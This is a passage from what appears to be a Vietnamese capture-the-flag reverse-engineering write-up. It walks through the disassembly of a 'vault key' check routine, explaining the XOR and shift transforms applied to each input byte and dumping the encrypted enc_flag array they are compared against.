</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>BA                 call    _exit
</span></span></code></pre></div><p>Nhìn vào mã assembly, mảng chúng ta cần nhập vào phải chứa 0x20 kí tự và nhảy vào <code>loc_13CE</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CE loc_13CE:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>CD<span style="color:#960050;background-color:#1e0010">↓</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>CE                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D4                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>D6                 movzx   eax, byte ptr [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">+</span>buf]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>DE                 movsx   rdx, al
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E2</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013E8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013</span>EA                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">2</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span><span style="color:#ae81ff">8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000013F</span>A                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001402</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span><span style="color:#ae81ff">8</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span>A                 xor     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000140</span>D                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001413</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001415</span>                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000141</span>D                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001423</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001425</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000142</span>D                 shl     rax, <span style="color:#ae81ff">10</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001431</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001434</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000143</span>A                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000143</span>C                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001444</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>A                 and     eax, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>D                 test    eax, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144F</span>                 jz      <span style="color:#66d9ef">short</span> loc_147C
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001451</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001457</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000145</span><span style="color:#ae81ff">9</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001461</span>                 xor     rax, <span style="color:#ae81ff">2070</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001467</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000146</span>A                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001470</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001472</span>                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>A                 jmp     <span style="color:#66d9ef">short</span> loc_14A5
</span></span></code></pre></div><p>Dễ thấy ở <code>rbp+var_2001D8</code> chứa biến đếm, mình tạm đặt là <code>idx</code>, thực hiện 1 số phép toán đối với từng kí tự trong mảng mình nhập vào, ta thấy sau đó có chỉ thị sau:</p>
<p>Đầu tiên là xor từng kí tự với idx, sau đó dịch trái 0x10 <code>shl rax, 10h</code> -&gt; <code>val = (y ^ idx) &lt;&lt; 0x10</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001444</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000144</span>A                 and     eax, <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Chương kiểm tra <code>idx</code> là chẵn hay lẻ, nếu chẵn sẽ nhảy tới <code>loc_147c</code>, ngược lại thì sẽ tiếp tục</p>
<p>Nễu idx chẵn sẽ xor giá trị <code>val</code> bên trên với 0x2070, còn chẵn thì sẽ tới loc_147c và xor <code>val</code> với 0x7020:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>C loc_147C:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">1E1</span><span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000147</span>C                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">82</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">84</span>                 mov     rax, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">8</span>C                 xor     rax, <span style="color:#ae81ff">7020</span>h
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">92</span>                 mov     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">95</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">9</span>B                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span><span style="color:#ae81ff">9</span>D                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5
</span></span></code></pre></div><p>Khái quát hóa:</p>
<pre><code>   chẵn: ((y ^ idx) &lt;&lt; 0x10) ^ 0x7020
   lẽ  : ((y ^ idx) &lt;&lt; 0x10) ^ 0x2070
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5 loc_14A5:                               ; CODE XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>C<span style="color:#960050;background-color:#1e0010">↑</span>j
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>A5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>AB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>AD                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>B5                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>BB                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>BD                 xor     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C0                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C6                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>C8                 mov     [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0], rdx
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D0                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D6                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014</span>D8                 mov     rdx, [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>var_2001D0]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E0</span>                 mov     eax, [rbp<span style="color:#f92672">+</span>var_2001D8]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E6</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E8</span>                 lea     rcx, ds:<span style="color:#ae81ff">0</span>[rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span><span style="color:#ae81ff">0</span>                 lea     rax, enc_flag     <span style="color:#f92672">-&gt;</span> enc_flag array
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span><span style="color:#ae81ff">7</span>                 mov     rax, [rcx<span style="color:#f92672">+</span>rax]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span>B                 cmp     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span>E                 jz      <span style="color:#66d9ef">short</span> loc_1519
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001500</span>                 lea     rax, s          ; <span style="color:#e6db74">&#34;Invalid vault key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001507</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000150</span>A                 call    _puts
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000150F</span>                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001514</span>                 call    _exit
</span></span></code></pre></div><p>Cuối cùng chương trình sẽ lấy giá trị vừa được tính ở trên <code>xor</code> lại với idx và kiểm tra với từng kí tự tương ứng của mảng enc_flag trong chương trình.</p>
<p><code>enc_flag</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002020</span>                 public enc_flag
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002020</span> enc_flag        db  <span style="color:#ae81ff">20</span>h                 ; DATA XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">282</span><span style="color:#960050;background-color:#1e0010">↑</span>o
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002021</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002022</span>                 db  <span style="color:#ae81ff">57</span>h ; W
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002023</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002024</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002025</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002026</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002027</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">71</span>h ; q
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>A                 db  <span style="color:#ae81ff">30</span>h ; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002030</span>                 db  <span style="color:#ae81ff">22</span>h ; <span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002031</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002032</span>                 db  <span style="color:#ae81ff">79</span>h ; y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002033</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002034</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002035</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002036</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002037</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">73</span>h ; s
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>A                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002040</span>                 db  <span style="color:#ae81ff">24</span>h ; <span style="color:#960050;background-color:#1e0010">$</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002041</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002042</span>                 db  <span style="color:#ae81ff">35</span>h ; <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002043</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002044</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002045</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002046</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002047</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">75</span>h ; u
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>A                 db  <span style="color:#ae81ff">71</span>h ; q
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002050</span>                 db  <span style="color:#ae81ff">26</span>h ; <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002051</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002052</span>                 db  <span style="color:#ae81ff">59</span>h ; Y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002053</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002054</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002055</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002056</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002057</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">77</span>h ; w
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>A                 db  <span style="color:#ae81ff">37</span>h ; <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002060</span>                 db  <span style="color:#ae81ff">28</span>h ; (
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002061</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002062</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002063</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002064</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002065</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002066</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002067</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">79</span>h ; y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>A                 db  <span style="color:#ae81ff">3</span>Ah ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002070</span>                 db  <span style="color:#ae81ff">2</span>Ah ; <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002071</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002072</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002073</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002074</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002075</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002076</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002077</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">7</span>Bh ; {
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>A                 db  <span style="color:#ae81ff">6</span>Ah ; j
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">80</span>                 db  <span style="color:#ae81ff">2</span>Ch ; ,
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">81</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">82</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">83</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">84</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">85</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">86</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">87</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">88</span>                 db  <span style="color:#ae81ff">7</span>Dh ; }
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">89</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>A                 db  <span style="color:#ae81ff">3</span>Ch ; <span style="color:#f92672">&lt;</span>
